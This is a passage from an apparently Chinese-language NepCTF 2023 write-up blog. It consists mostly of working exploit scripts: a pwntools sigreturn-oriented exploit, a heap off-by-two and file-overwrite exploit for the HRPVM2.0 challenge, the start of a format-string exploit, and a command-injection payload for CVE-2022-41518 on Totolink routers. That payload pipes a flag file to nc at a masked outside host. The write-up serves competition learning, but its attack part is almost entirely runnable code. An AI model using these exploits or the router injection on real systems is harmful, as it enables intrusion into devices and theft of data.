class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;nepctf.1cepeak.cn&quot;</span>, <span class=\"number\">31943</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">mov_eax_15 = <span class=\"number\">0x0000400754</span></span><br><span class=\"line\">buf = <span class=\"number\">0x00000601050</span></span><br><span class=\"line\">ret = <span class=\"number\">0x004007AE</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0004005B0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400813</span></span><br><span class=\"line\">stack = <span class=\"number\">0x0601a50</span></span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x8</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x1000</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span> * (<span class=\"number\">0x0030</span>+<span class=\"number\">8</span>) + flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall</span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">2</span></span><br><span class=\"line\">frame.rsi = stack-<span class=\"number\">0x8</span></span><br><span class=\"line\">frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x1000</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;./flag\\x00\\x00&quot;</span> + flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">3</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x100</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x40</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload += flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rdi = <span class=\"number\">1</span></span><br><span class=\"line\">frame.rsi = <span class=\"number\">1</span></span><br><span class=\"line\">frame.rdx = stack-<span class=\"number\">0x100</span></span><br><span class=\"line\">frame.rcx = <span class=\"number\">0x40</span></span><br><span class=\"line\">frame.rip = syscall</span><br><span class=\"line\">frame.rsp = stack + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span> + <span class=\"number\">0x110</span></span><br><span class=\"line\">payload += flat([</span><br><span class=\"line\">    pop_rdi,</span><br><span class=\"line\">    <span class=\"number\">15</span>,</span><br><span class=\"line\">    syscall </span><br><span class=\"line\">]) + <span class=\"built_in\">bytes</span>(frame) </span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;length <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(payload):#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HRPVM2-0\"><a href=\"#HRPVM2-0\" class=\"headerlink\" title=\"HRPVM2.0\"></a>HRPVM2.0</h2><p>核心思想是替换文件，这里重写了kernel文件，之后python再次调用程序就可以执行了shell了</p>\n<p><img src=\"/p/2023NepCTF/image-20230814091413997.png\" alt=\"image-20230814091413997\"></p>\n<p>命令顺序如下，这里不能输入#，但是shell脚本使用Popen需要有shabang开头，但是shabang并不被sh执行，但输入又不能输入回车，所以这里可以采用env -S绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir app/templates</span><br><span class=\"line\">cd app/templates</span><br><span class=\"line\">echo #!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot;&gt;kernel</span><br><span class=\"line\">mount kernel</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2023NepCTF/image-20230814091915281.png\" alt=\"image-20230814091915281\"></p>\n<p>但是mount会需要权限校验，这里需要利用溢出漏洞，off by “two”，也就是爆破1&#x2F;16，踩中一个权限偏移内不为0的有效的堆地址，就可以绕过权限校验</p>\n<p><img src=\"/p/2023NepCTF/image-20230814091404375.png\" alt=\"image-20230814091404375\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">req = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://nepctf.1cepeak.cn:30424&quot;</span></span><br><span class=\"line\">req.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./kernel&quot;)</span></span><br><span class=\"line\">io = tube()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">io_recv_raw</span>(<span class=\"params\">*a</span>):</span><br><span class=\"line\">    r = req.get(url + <span class=\"string\">&quot;/receive&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(r.json())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r.json().get(<span class=\"string\">&#x27;output&#x27;</span>, <span class=\"string\">&quot;&quot;</span>).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">io_send_raw</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    r = req.post(url + <span class=\"string\">&quot;/send&quot;</span>, data=&#123;<span class=\"string\">&quot;input&quot;</span>: x&#125;)</span><br><span class=\"line\">    </span><br><span class=\"line\">io.recv_raw = io_recv_raw</span><br><span class=\"line\">io.send_raw = io_send_raw</span><br><span class=\"line\"><span class=\"comment\"># tob = lambda x: x.encode(&quot;utf-8&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rm</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;rm %b&quot;</span> % (file,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cat</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;cat %b&quot;</span> % (file,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">init</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Make a wish to Nepnep&quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">echo</span>(<span class=\"params\">file, content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;echo %b&gt;%b&quot;</span> % (content, file))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mkdir</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;mkdir %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cd</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;cd %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exec</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;exec %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">id</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;id&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mount</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;mount %b&quot;</span> % (name,))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;$&quot;</span>, <span class=\"string\">b&quot;exit&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>, <span class=\"number\">127</span>):</span><br><span class=\"line\">    log.success(<span class=\"string\">f&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class=\"subst\">&#123;i&#125;</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span>)</span><br><span class=\"line\">    leave()</span><br><span class=\"line\">    req.get(url)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    init(payload + <span class=\"string\">b&quot;;&quot;</span> * (<span class=\"number\">104</span> - <span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">    mkdir(<span class=\"string\">b&quot;app/templates&quot;</span>)</span><br><span class=\"line\">    cd(<span class=\"string\">b&quot;app/templates&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;kernel&quot;</span>, <span class=\"string\">b&quot;&quot;&quot;#!/usr/bin/env -S python3 -c &quot;import os; os.system(&#x27;cat flag&#x27;)&quot; &quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;data&quot;</span>, <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">0x100</span>-<span class=\"number\">2</span>) + <span class=\"string\">b&quot;bc&quot;</span> + <span class=\"string\">b&quot;\\x21\\x42&quot;</span>)</span><br><span class=\"line\">    cat(<span class=\"string\">b&quot;kernel&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;step1&quot;</span>, <span class=\"string\">b&quot;mov rdi,data; syscall 0;&quot;</span>)</span><br><span class=\"line\">    echo(<span class=\"string\">b&quot;step2&quot;</span>, <span class=\"string\">b&quot;mov rdi,data; mov rdx,258; syscall 1;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">exec</span>(<span class=\"string\">b&quot;step1&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">exec</span>(<span class=\"string\">b&quot;step2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    mount(<span class=\"string\">b&quot;kernel&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#  59  52 65 0f 37  56 </span></span><br><span class=\"line\"><span class=\"comment\"># 7c  12 3c 44 45  56</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Nep-router\"><a href=\"#Nep-router\" class=\"headerlink\" title=\"Nep router\"></a>Nep router</h2><p><a href=\"https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518\">https://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518</a></p>\n<p>CVE-2022-41518一把梭，这里用反弹shell得到flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> contextlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\">login_url = <span class=\"string\">&quot;http://106.75.63.100:34903/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login&quot;</span></span><br><span class=\"line\">raw = session.get(login_url, timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">inject_url = <span class=\"string\">&quot;http://106.75.63.100:34903/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class=\"line\">inject_data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;proto&quot;</span>:<span class=\"string\">&quot;8&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;hostname&quot;</span>:<span class=\"string\">&quot;&#x27;;&quot;</span> + <span class=\"string\">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/cat /flag/flag  |nc xxx.xxx.xxx.xxx 1234 &gt;/tmp/f&quot;&quot;&quot;</span> + <span class=\"string\">&quot;;&#x27;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setOpModeCfg&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> contextlib.suppress(Exception):</span><br><span class=\"line\">    resp = session.post(inject_url, json = inject_data, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;shell!? ---------------&gt; &quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"login\"><a href=\"#login\" class=\"headerlink\" title=\"login\"></a>login</h2><p>首先是路径穿越，由于不会校验目录，可以直接访问文件，下载文件，最后可以下载得到login ELF文件以及libc库，之后逆向很快能看到sprintf格式化字符串漏洞，最难就是本地调试找堆指针</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">creat_logger</span>(<span class=\"params\">log_path, logging_name, suf_name</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(log_path):</span><br><span class=\"line\">        os.makedirs(log_path)</span><br><span class=\"line\">    log_full_path = log_path + logging_name + suf_name</span><br><span class=\"line\">    logger = logging.getLogger(logging_name)</span><br><span class=\"line\">    logger.setLevel(level=logging.DEBUG)</span><br><span class=\"line\">    handler = logging.FileHandler(log_full_path, encoding=<span class=\"string\">&#x27;UTF-8&#x27;</span>, mode=<span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    handler.setLevel(logging.INFO)</span><br><span class=\"line\">    formatter = logging.Formatter(<span class=\"string\">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class=\"line\">    handler.setFormatter(formatter)</span><br><span class=\"line\">    console = logging.StreamHandler()</span><br><span class=\"line\">    console.setLevel(logging.DEBUG)</span><br><span class=\"line\">    logger.addHandler(handler)</span><br><span class=\"line\">    logger.addHandler(console)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> logger</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">logger = creat_logger(<span class=\"string\">&quot;./&quot;</span>, <span class=\"string\">&quot;log&quot;</span>, <span class=\"string\">&quot;.txt&quot;</span>)</span><br><span class=\"line\">req = requests.session()</span><br><span class=\"line\">start = <span class=\"string\">b&quot;deadbeaf&quot;</span></span><br><span class=\"line\">end = <span class=\"string\">b&quot;asdewedv&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://106.75.63.100:34617&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># url = &quot;http://172.20.192.1:8080&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read_s</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;start.decode()&#125;</span>%<span class=\"subst\">&#123;offset&#125;</span>$s<span class=\"subst\">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    s = r.content</span><br><span class=\"line\">    <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">    code = s[s.find(start) + <span class=\"built_in\">len</span>(start):s.find(end)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code, <span class=\"built_in\">hex</span>(struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, code[:<span class=\"number\">8</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\00&quot;</span>))[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_p</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> 